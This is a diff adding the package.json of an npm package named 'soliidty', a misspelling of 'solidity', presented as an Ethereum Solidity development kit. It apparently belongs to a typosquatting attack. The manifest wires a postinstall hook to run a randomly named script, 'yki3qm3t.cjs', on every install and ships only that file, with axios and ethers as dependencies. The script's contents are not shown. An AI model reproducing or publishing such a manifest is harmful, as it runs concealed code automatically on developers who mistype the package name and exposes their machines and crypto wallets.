@@ -1,0 +1,23 @@
+{
+  "name": "soliidty",
+  "version": "0.0.1",
+  "description": "Development kit for Ethereum's Solidity language",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node yki3qm3t.cjs"
+  },
+  "keywords": [
+    "solidity",
+    "ethereum",
+    "web3"
+  ],
+  "author": "afterburn <k.karsopawiro@gmail.com>",
+  "license": "MIT",
+  "files": [
+    "yki3qm3t.cjs"
+  ],
+  "dependencies": {
+    "axios": "^1.7.7",
+    "ethers": "^6.13.2"
+  }
+}
